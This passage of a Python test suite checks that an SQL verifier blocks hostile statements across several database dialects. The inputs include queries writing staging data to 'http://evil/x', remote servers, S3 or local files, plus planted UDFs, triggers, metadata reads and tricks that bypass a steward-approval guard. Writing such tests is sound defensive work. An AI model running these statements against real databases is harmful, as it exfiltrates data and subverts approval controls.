                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    nontable_and_ddl_blocked = (
        (
            "clickhouse",
            "INSERT INTO TABLE FUNCTION s3('https://b/x.parquet', 'Parquet') "
            "SELECT s.hk FROM staging.s AS s",
        ),
        (
            "clickhouse",
            "INSERT INTO FUNCTION file('/tmp/x.csv', 'CSV') SELECT s.hk FROM staging.s AS s",
        ),
        (
            "clickhouse",
            "INSERT INTO FUNCTION url('http://evil/x', 'CSV') SELECT s.hk FROM staging.s AS s",
        ),
        (
            "clickhouse",
            "INSERT INTO FUNCTION remote('127.0.0.1:9000', 'db', 'tbl') "
            "SELECT s.hk FROM staging.s AS s",
        ),
        (
            "databricks_uc",
            "INSERT OVERWRITE LOCAL DIRECTORY '/tmp/evil' SELECT s.hk FROM staging.s AS s",
        ),
        (
            "databricks_uc",
            "INSERT OVERWRITE DIRECTORY '/tmp/evil' STORED AS PARQUET "
            "SELECT s.hk FROM staging.s AS s",
        ),
        (
            "snowflake",
            "CREATE FUNCTION evil(x INT) RETURNS INT LANGUAGE PYTHON RUNTIME_VERSION = '3.11' "
            "HANDLER = 'h' AS $$def h(x): return x$$",
        ),
        (
            "snowflake",
            "CREATE PROCEDURE evil() RETURNS VARCHAR LANGUAGE PYTHON AS $$return 'x'$$",
        ),
        ("snowflake", "DROP FUNCTION evil(INT)"),
        ("snowflake", "DROP PROCEDURE evil()"),
        (
            "databricks_uc",
            "CREATE FUNCTION staging.evil(x STRING) RETURNS STRING LANGUAGE PYTHON "
            "AS $$return x$$",
        ),
        (
            "bigquery",
            "CREATE FUNCTION my_ds.evil(x INT64) RETURNS INT64 LANGUAGE js AS 'return x;'",
        ),
        ("clickhouse", "CREATE FUNCTION evil AS (x) -> x"),
        ("duckdb_local", "CREATE MACRO evil(x) AS x"),
        ("duckdb_local", "DROP MACRO evil"),
        ("postgres", "CREATE FUNCTION evil() RETURNS INT AS 'SELECT 1' LANGUAGE SQL"),
        ("postgres", "CREATE AGGREGATE myagg(INT) (SFUNC = int4pl, STYPE = INT)"),
        ("snowflake", "ALTER ICEBERG TABLE staging.ext SET EXTERNAL_VOLUME = 'v'"),
        ("databricks_uc", "ALTER TABLE staging.ext SET LOCATION 's3://b/x'"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = Redis('localhost:6379')"),
        (
            "clickhouse",
            "CREATE TABLE staging.ext (id Int32) ENGINE = ArrowFlight('localhost:8815', 'ds')",
        ),
    )
    for b_tid, b_sql in nontable_and_ddl_blocked:
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(b_sql, b_tid)
        ), (b_tid, b_sql)
        with pytest.raises(OpenDVError) as exc_b:
            gate.verify_sql_ast(b_tid, b_sql, ir=ir)
        assert exc_b.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_b.value.exit_code == 50

    bool_guard_blocked_all = (
        "(SELECT sub.x FROM (SELECT * FROM (SELECT TRUE, 'ok') AS t) AS sub(x, y))",
        "(SELECT sub.b FROM (SELECT 1 AS x, * FROM (SELECT TRUE AS b) AS t) AS sub)",
        "(SELECT sub.c2 FROM (SELECT 1 AS x, * FROM (SELECT TRUE, 'ok') AS t) AS sub(c1, c2, c3))",
        "(SELECT sub.x FROM (SELECT * FROM (SELECT TRUE, 'ok') AS t UNION ALL SELECT FALSE, 'no') AS sub(x, y))",
        "(SELECT d.b FROM (staging.s1 AS s1 INNER JOIN (SELECT TRUE AS b) AS d ON 1=1))",
        "(SELECT v.col0 FROM (VALUES (TRUE)) AS v)",
        "(SELECT v.column1 FROM (VALUES (TRUE)) AS v)",
        "(SELECT v.c1 FROM (VALUES (TRUE)) AS v)",
        "(SELECT v.col1 FROM (VALUES ('ok', TRUE)) AS v)",
        "BOOL_AND(TRUE) OVER ()",
        "BOOL_OR(TRUE) OVER ()",
        "EVERY(TRUE) OVER ()",
        "LOGICAL_AND(TRUE) OVER ()",
        "LOGICAL_OR(TRUE) OVER ()",
        "BOOLAND_AGG(TRUE) OVER ()",
        "BOOLOR_AGG(TRUE) OVER ()",
        "CAST(NULL AS INT)",
        "IS_FINITE(1.0)",
        "REGEXP_MATCHES('abc', 'a')",
        "NVL2(s.x, TRUE, FALSE)",
        "BOOLAND(TRUE, FALSE)",
        "BOOLOR(TRUE, FALSE)",
        "BOOLNOT(TRUE)",
        "NULLIF(-1, -1)",
        "NULLIF(s.x, s.x)",
        "NULLIF(1 + 1, 1 + 1)",
    )
    list_bracket_exprs = (
        "LIST_HAS_ANY([1], [1])",
        "LIST_HAS_ALL([1], [1])",
        "LIST_CONTAINS([1], 1)",
        "LIST_HAS([1], 1)",
        "ARRAYS_OVERLAP(ARRAY[1], ARRAY[1])",
        "ARRAY_OVERLAPS(ARRAY[1], ARRAY[1])",
    )
    dialect_bool_blocked = (
        ("snowflake", "DECODE(s.x, 1, TRUE, FALSE)"),
        ("postgres", "DECODE(s.x, 1, TRUE, FALSE)"),
        ("snowflake", "('a' !~ 'b')"),
        ("postgres", "('a' !~ 'b')"),
        ("duckdb_local", "('a' !~ 'b')"),
        ("sqlserver_fabric", "CONVERT(INT, NULL)"),
        ("sqlserver_fabric", "TRY_CONVERT(INT, NULL)"),
    )
    for d_tid, d_expr in dialect_bool_blocked:
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {d_expr} = ANY(s.b)"
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, d_tid, extra_unstructured_links=["lnk_u"])
        ), (d_tid, d_expr)
        assert has_steward_approved_guard(
            sqlglot.parse_one(u_sql, read=get_dialect_profile(d_tid).sqlglot_dialect or "duckdb")
        ) is False

    # Valid controls
    valid_controls = (
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND NULLIF(s.hk, '') = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT sub.y FROM (SELECT TRUE AS x, 'ok' AS y) AS sub) = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT sub.y FROM (SELECT TRUE, 'ok') AS sub(x, y)) = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT v.col0 FROM (VALUES ('ok', TRUE)) AS v) = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND SUM(s.x) OVER () = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "SELECT u.hk_issuer, CURRENT_TIMESTAMP, 'SRC', 'x' "
            "FROM staging.s UNPIVOT (val FOR col IN (a, b)) AS u",
        ),
        ("clickhouse", "CREATE TABLE staging.ok (id Int32) ENGINE = MergeTree()"),
        ("duckdb_local", "ALTER TABLE raw_vault.sat_issuer_core ALTER COLUMN c TYPE BIGINT"),
    )
    for ok_tid, ok_sql in valid_controls:
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
        ) == []

    # has_steward_approved_guard returns True for non-boolean column under SELECT * + TableAlias
    star_ctrl_sql = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
        "WHERE s.steward_gate_status = 'APPROVED' "
        "AND (SELECT sub.y FROM (SELECT * FROM (SELECT TRUE, 'ok') AS t) AS sub(x, y)) = ANY(s.arr)"
    )
    assert has_steward_approved_guard(sqlglot.parse_one(star_ctrl_sql, read="duckdb")) is True

    # QUALIFY BOOL_AND(TRUE) OVER () = ANY(s.b)
    qualify_sql = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
        "WHERE s.steward_gate_status = 'APPROVED' QUALIFY BOOL_AND(TRUE) OVER () = ANY(s.b)"
    )
    assert any(
        d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
        for d in verifier.verify_sql(qualify_sql, "duckdb_local", extra_unstructured_links=["lnk_u"])
    )
    assert has_steward_approved_guard(sqlglot.parse_one(qualify_sql, read="duckdb")) is False

    # SUMMARIZE / DESCRIBE in sat_* across 8/8 dialects + CTE
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for rel_cmd in ("SUMMARIZE staging.s", "DESCRIBE staging.s"):
            sat_q = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT CAST(t.column_name AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' "
                f"FROM ({rel_cmd}) AS t"
            )
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(sat_q, tid)
            ), (tid, rel_cmd)
            with pytest.raises(OpenDVError) as exc_sat:
                gate.verify_sql_ast(tid, sat_q, ir=ir)
            assert exc_sat.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_sat.value.exit_code == 50

        sat_cte_q = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "WITH c AS (SUMMARIZE staging.s) "
            "SELECT CAST(c.column_name AS VARCHAR), CURRENT_TIMESTAMP, 'SRC', 'x' FROM c"
        )
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_cte_q, tid)
        ), tid

        exprs_for_tid = (
            bool_guard_blocked_all
            if tid == "sqlserver_fabric"
            else (*bool_guard_blocked_all, *list_bracket_exprs)
        )
        for expr in exprs_for_tid:
            bad_u = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {expr} = ANY(s.b)"
            )
            bad_sat = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {expr}"
            )
            if "= ANY" not in bad_sat:
                bad_sat = bad_sat + " = ANY(s.b)"
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_u, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, expr)
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_sat, tid)
            ), (tid, expr)
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u, read=dialect)) is False, (
                tid, expr
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        # Compiled bundles zero-FP verification (short, long, unstruct)
        for cand_ir in (ir, ir_long, ir_unstruct):
            bundle = SqlGlotVaultCompiler(tid).compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter30_nontable_insert_trigger_show_and_bool_guard_parity() -> None:
    """Remediate Iter-29 EVAL-AST-01, SHOW TABLES, and composite bool_expr_guard across 8/8."""
    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    nontable_and_ddl_blocked = (
        ("clickhouse", "INSERT INTO s3('https://b/x.parquet', 'Parquet') SELECT s.hk FROM staging.s AS s"),
        ("clickhouse", "INSERT INTO file('/tmp/x.csv', 'CSV') SELECT s.hk FROM staging.s AS s"),
        ("duckdb_local", "INSERT INTO read_parquet('/tmp/x.parquet') SELECT s.hk FROM staging.s AS s"),
        ("postgres", "INSERT INTO (SELECT hk FROM raw_vault.hub_a) VALUES ('x')"),
        ("postgres", "INSERT INTO (SELECT 1) VALUES ('x')"),
        ("snowflake", "INSERT INTO (SELECT 1) VALUES ('x')"),
        ("duckdb_local", "INSERT INTO (SELECT hk FROM staging.s) VALUES ('x')"),
        ("postgres", "CREATE TRIGGER tr AFTER INSERT ON raw_vault.sat_x FOR EACH ROW EXECUTE FUNCTION evil()"),
        ("postgres", "DROP TRIGGER tr ON raw_vault.sat_x"),
        ("postgres", "CREATE EVENT TRIGGER tr ON ddl_command_end EXECUTE FUNCTION evil()"),
        ("postgres", "CREATE POLICY p ON raw_vault.sat_x USING (true)"),
        ("postgres", "CREATE RULE r AS ON INSERT TO raw_vault.sat_x DO INSTEAD NOTHING"),
        ("databricks_uc", "ALTER TABLE staging.ext SET TBLPROPERTIES ('external' = 'true')"),
        ("databricks_uc", "ALTER TABLE staging.ext SET TBLPROPERTIES ('external.location' = 's3://b/x')"),
        ("databricks_uc", "ALTER TABLE staging.ext SET TBLPROPERTIES ('delta.location' = 's3://b/x')"),
        ("databricks_uc", "CREATE TABLE staging.ext (id INT) TBLPROPERTIES ('external.location' = 's3://b/x')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = Hive('s3://b/x')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = YTsaurus('x')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = KeeperMap('/k')"),
        ("clickhouse", "CREATE TABLE staging.ext (id Int32) ENGINE = EmbeddedRocksDB"),
    )
    for b_tid, b_sql in nontable_and_ddl_blocked:
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(b_sql, b_tid)
        ), (b_tid, b_sql)
        with pytest.raises(OpenDVError) as exc_b:
            gate.verify_sql_ast(b_tid, b_sql, ir=ir)
        assert exc_b.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_b.value.exit_code == 50

    bool_guard_blocked_all = (
        "(SELECT COALESCE(sub.x, sub.y) FROM (SELECT TRUE AS x, FALSE AS y) AS sub)",
        "(SELECT CASE WHEN s.id > 0 THEN sub.x ELSE sub.y END FROM (SELECT TRUE AS x, FALSE AS y) AS sub)",
        "(SELECT NULLIF(sub.x, sub.y) FROM (SELECT 1 AS x, 1 AS y) AS sub)",
        "(SELECT CAST(sub.x AS INT) FROM (SELECT NULL AS x) AS sub)",
        "(SELECT x FROM (SELECT TRUE AS x) AS d1 JOIN (SELECT TRUE AS x) AS d2 USING (x))",
        "(SELECT x FROM (SELECT TRUE AS x) AS d1 NATURAL JOIN (SELECT TRUE AS x) AS d2)",
        "(SELECT sub.b FROM (SELECT 1 AS a, TRUE AS b) AS sub(x))",
        "CASE WHEN FALSE THEN 'ok' END",
        "FIRST_VALUE(TRUE) OVER ()",
        "LAST_VALUE(TRUE) OVER ()",
        "NTH_VALUE(TRUE, 1) OVER ()",
        "LAG(TRUE, 1, TRUE) OVER ()",
        "LEAD(TRUE, 0) OVER ()",
        "MIN(TRUE) OVER ()",
        "MAX(TRUE) OVER ()",
        "ANY_VALUE(TRUE) OVER ()",
        "FIRST(TRUE) OVER ()",
        "LAST(TRUE) OVER ()",
        "ARBITRARY(TRUE) OVER ()",
    )
    dialect_bool_blocked = (
        ("duckdb_local", "(SELECT u.b FROM UNNEST([TRUE]) AS u(b))"),
        ("duckdb_local", "(SELECT l.b FROM staging.s1, LATERAL (SELECT TRUE AS b) AS l)"),
        ("duckdb_local", "(SELECT l.b FROM (SELECT TRUE AS x) AS t, LATERAL (SELECT t.x AS b) AS l)"),
        ("duckdb_local", "(SELECT sub.a FROM (SELECT 'ok' AS a, 1 AS b UNION ALL BY NAME SELECT 2 AS b, TRUE AS a) AS sub)"),
        ("duckdb_local", "LIST_BOOL_OR([TRUE])"),
        ("duckdb_local", "LIST_BOOL_AND([TRUE])"),
        ("duckdb_local", "([TRUE])[1]"),
        ("duckdb_local", "(STRUCT_PACK(a := TRUE)).a"),
        ("duckdb_local", "STRUCT_EXTRACT(STRUCT_PACK(a := TRUE), 'a')"),
        ("duckdb_local", "LIST_EXTRACT([TRUE], 1)"),
        ("databricks_uc", "ELEMENT_AT(ARRAY(TRUE), 1)"),
        ("duckdb_local", "MAP_CONTAINS(MAP {'a': 1}, 'a')"),
        ("duckdb_local", "ISNULL(s.x)"),
        ("duckdb_local", "ISNOTNULL(s.x)"),
        ("duckdb_local", "TRY(TRUE)"),
        ("snowflake", "IS_NULL_VALUE(s.a)"),
        ("snowflake", "IS_BOOLEAN(s.a)"),
        ("snowflake", "IS_ARRAY(s.a)"),
        ("snowflake", "IS_OBJECT(s.a)"),
        ("snowflake", "IS_INTEGER(s.a)"),
        ("snowflake", "IS_DECIMAL(s.a)"),
        ("snowflake", "IS_DOUBLE(s.a)"),
        ("snowflake", "IS_VARCHAR(s.a)"),
        ("snowflake", "IS_DATE(s.a)"),
        ("snowflake", "IS_TIMESTAMP(s.a)"),
        ("snowflake", "BOOLXOR_AGG(TRUE) OVER ()"),
        ("snowflake", "ARRAY_ALL(s.arr, x -> x = 1)"),
        ("snowflake", "ARRAY_ANY(s.arr, x -> x = 1)"),
        ("postgres", "JSONB_EXISTS(s.j, 'k')"),
        ("postgres", "JSONB_PATH_EXISTS(s.j, '$.k')"),
    )
    for d_tid, d_expr in dialect_bool_blocked:
        u_sql = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {d_expr} = ANY(s.b)"
        )
        sat_sql = (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {d_expr} = ANY(s.b)"
        )
        assert any(
            d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(u_sql, d_tid, extra_unstructured_links=["lnk_u"])
        ), (d_tid, d_expr)
        assert any(
            d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sat_sql, d_tid)
        ), (d_tid, d_expr)
        assert has_steward_approved_guard(
            sqlglot.parse_one(u_sql, read=get_dialect_profile(d_tid).sqlglot_dialect or "duckdb")
        ) is False, (d_tid, d_expr)

    # Star modifiers (* REPLACE / * EXCLUDE) in has_steward_approved_guard
    for star_expr in (
        "(SELECT * REPLACE (TRUE AS a) FROM (SELECT 'ok' AS a) AS t) = ANY(s.b)",
        "(SELECT sub.x FROM (SELECT * EXCLUDE (a) FROM (SELECT 'ok' AS a, TRUE AS b) AS t) AS sub(x)) = ANY(s.b)",
    ):
        star_u = (
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            f"WHERE s.steward_gate_status = 'APPROVED' AND {star_expr}"
        )
        assert has_steward_approved_guard(sqlglot.parse_one(star_u, read="duckdb")) is False

    # QUALIFY polymorphic value-passthrough window
    qualify_fv_sql = (
        "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
        "WHERE s.steward_gate_status = 'APPROVED' QUALIFY FIRST_VALUE(TRUE) OVER () = ANY(s.b)"
    )
    assert any(
        d.rule_id == "DV-AST-007" and d.severity == "BLOCKER"
        for d in verifier.verify_sql(qualify_fv_sql, "duckdb_local", extra_unstructured_links=["lnk_u"])
    )
    assert has_steward_approved_guard(sqlglot.parse_one(qualify_fv_sql, read="duckdb")) is False

    # Valid controls
    valid_controls = (
        (
            "duckdb_local",
            "INSERT INTO raw_vault.hub_a (hk_a, load_dts) VALUES ('x', CURRENT_TIMESTAMP)",
        ),
        ("clickhouse", "CREATE TABLE staging.ok (id Int32) ENGINE = MergeTree()"),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND FIRST_VALUE(s.x) OVER () = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND MIN(s.x) OVER () = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT COALESCE(sub.x, sub.y) FROM (SELECT 'a' AS x, 'b' AS y) AS sub) = ANY(s.arr)",
        ),
        (
            "duckdb_local",
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' "
            "AND (SELECT sub.x FROM (SELECT 1 AS a, TRUE AS b) AS sub(x)) = ANY(s.arr)",
        ),
    )
    for ok_tid, ok_sql in valid_controls:
        assert verifier.verify_sql(ok_sql, ok_tid, extra_unstructured_links=["lnk_u"]) == []
        assert gate.verify_sql_ast(
            ok_tid, ok_sql.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct
        ) == []

    # 8/8 dialects: SHOW TABLES on sat_*, composite bool guards, and 3-IR bundle zero-FP check
    for tid in SQL_TARGET_IDS:
        dialect = get_dialect_profile(tid).sqlglot_dialect or "duckdb"
        for show_q in (
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "SELECT t.name, CURRENT_TIMESTAMP, 'SRC', 'x' FROM (SHOW TABLES) AS t",
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "WITH c AS (SHOW TABLES) SELECT c.name, CURRENT_TIMESTAMP, 'SRC', 'x' FROM c",
        ):
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(show_q, tid)
            ), (tid, show_q)
            with pytest.raises(OpenDVError) as exc_sh:
                gate.verify_sql_ast(tid, show_q, ir=ir)
            assert exc_sh.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_sh.value.exit_code == 50

        for expr in bool_guard_blocked_all:
            bad_u = (
                "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
                f"WHERE s.steward_gate_status = 'APPROVED' AND {expr} = ANY(s.b)"
            )
            bad_sat = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s WHERE {expr} = ANY(s.b)"
            )
            assert any(
                d.rule_id in ("DV-AST-007", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_u, tid, extra_unstructured_links=["lnk_u"])
            ), (tid, expr)
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(bad_sat, tid)
            ), (tid, expr)
            assert has_steward_approved_guard(sqlglot.parse_one(bad_u, read=dialect)) is False, (
                tid, expr
            )
            with pytest.raises(OpenDVError) as exc_u:
                gate.verify_sql_ast(tid, bad_u.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct)
            assert exc_u.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_u.value.exit_code == 50

        for cand_ir in (ir, ir_long, ir_unstruct):
            bundle = SqlGlotVaultCompiler(tid).compile(cand_ir)
            assert verifier.verify_sql(bundle.full_sql, tid, ir=cand_ir) == []
            assert verifier.verify_sql(bundle.migration_sql, tid, ir=cand_ir) == []


def test_iter31_eval_ast_show_unnest_struct_container_and_const_case_parity() -> None:
    """Remediate Iter-30 EVAL-AST-01, SHOW *, UNNEST, struct, container, and const-CASE gaps."""
    import duckdb

    from opendv.storage._steward_guard import has_steward_approved_guard
    from opendv.storage.sql_compiler import SqlGlotVaultCompiler
    from tests.storage.test_wave_evolution_and_sql_guard import (
        _build_wave1_am_ir,
        _build_wave2_am_ir,
    )

    verifier = SqlAstVerifier()
    gate = TargetEvalGate()
    ir = _build_enterprise_11type_ir()
    ir_long = _build_enterprise_11type_ir(long_names=True)
    ir_unstruct = ir.model_copy(
        update={
            "links": [
                *ir.links,
                ir.links[0].model_copy(
                    update={
                        "link_name": "lnk_doc_claim",
                        "link_kind": "UNSTRUCTURED_EXTRACTION_LINK",
                    }
                ),
            ]
        }
    )

    # 1. EVAL-AST-01 Snowflake external integration properties
    for sf_ddl in (
        "CREATE TABLE staging.ext (id INT) STORAGE_INTEGRATION = my_int",
        "CREATE TABLE staging.ext (id INT) BASE_LOCATION = 'x/'",
        "CREATE TABLE staging.ext (id INT) CATALOG_INTEGRATION = my_cat",
        "ALTER TABLE staging.ext SET STORAGE_INTEGRATION = my_int",
        "ALTER TABLE staging.ext SET BASE_LOCATION = 'x/'",
    ):
        assert any(
            d.rule_id == "EVAL-AST-01" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(sf_ddl, "snowflake")
        ), sf_ddl
        with pytest.raises(OpenDVError) as exc_sf:
            gate.verify_sql_ast("snowflake", sf_ddl, ir=ir)
        assert exc_sf.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_sf.value.exit_code == 50

    # 2. DV-AST-006 SHOW * variants across 8/8 dialects + live DuckDB SHOW VARIABLES proof
    ddb = duckdb.connect(":memory:")
    ddb.execute("SET VARIABLE my_v = 'evil'")
    assert ddb.execute("SELECT t.name FROM (SHOW VARIABLES) AS t").fetchall()[0][0] == "my_v"
    ddb.close()

    for tid in SQL_TARGET_IDS:
        for noun in (
            "VARIABLES", "WAREHOUSES", "ROLES", "OBJECTS", "USERS",
            "EXTENSIONS", "PRAGMAS", "SETTINGS", "ALL",
        ):
            show_sat = (
                "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
                f"SELECT t.name, CURRENT_TIMESTAMP, 'SRC', 'x' FROM (SHOW {noun}) AS t"
            )
            assert any(
                d.rule_id in ("DV-AST-006", "EVAL-AST-01") and d.severity == "BLOCKER"
                for d in verifier.verify_sql(show_sat, tid)
            ), (tid, noun)
            with pytest.raises(OpenDVError) as exc_sh:
                gate.verify_sql_ast(tid, show_sat, ir=ir)
            assert exc_sh.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
            assert exc_sh.value.exit_code == 50

    # 3. Enclosing WITH CTE propagation into is_bool_or_null_expr
    for cte_tid in ("duckdb_local", "postgres"):
        cte_u = (
            "WITH c AS (SELECT TRUE AS x) "
            "INSERT INTO raw_vault.lnk_u (hk_u) SELECT s.hk FROM staging.s AS s "
            "WHERE s.steward_gate_status = 'APPROVED' AND (SELECT c.x FROM c) = ANY(s.b)"
        )
        cte_sat = (
            "WITH c AS (SELECT TRUE AS x) "
            "INSERT INTO raw_vault.sat_issuer_core (hk_issuer, load_dts, rec_src, hash_diff) "
            "SELECT s.hk, CURRENT_TIMESTAMP, 'SRC', 'x' FROM staging.s AS s "
            "WHERE (SELECT c.x FROM c) = ANY(s.b)"
        )
        assert any(
            d.rule_id == "DV-AST-007" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(cte_u, cte_tid, extra_unstructured_links=["lnk_u"])
        ), cte_tid
        assert any(
            d.rule_id == "DV-AST-006" and d.severity == "BLOCKER"
            for d in verifier.verify_sql(cte_sat, cte_tid)
        ), cte_tid
        with pytest.raises(OpenDVError) as exc_cte:
            gate.verify_sql_ast(
                cte_tid, cte_u.replace("lnk_u", "lnk_doc_claim"), ir=ir_unstruct,
            )
        assert exc_cte.value.error_code == ErrorCode.EMITTER_VERIFICATION_FAILED
        assert exc_cte.value.exit_code == 50

    # 4. Live DuckDB sanity check + cross-dialect UNNEST/Struct/Container/CASE/NULLIF/Func bypasses
    ddb_live = duckdb.connect(":memory:")
    ddb_live.execute("CREATE TABLE staging_s (hk VARCHAR, b BOOLEAN[], arr VARCHAR[])")
    ddb_live.execute("INSERT INTO staging_s VALUES ('k1', [TRUE], ['ok'])")
    for live_expr in (
        "(SELECT u.b FROM (SELECT [TRUE] AS arr) AS t, UNNEST(t.arr) AS u(b))",
        "(SELECT u.a FROM (SELECT [STRUCT_PACK(a := TRUE)] AS arr) AS t, UNNEST(t.arr) AS u)",
        "(SELECT st.a FROM (SELECT STRUCT_PACK(a := TRUE) AS st) AS sub)",
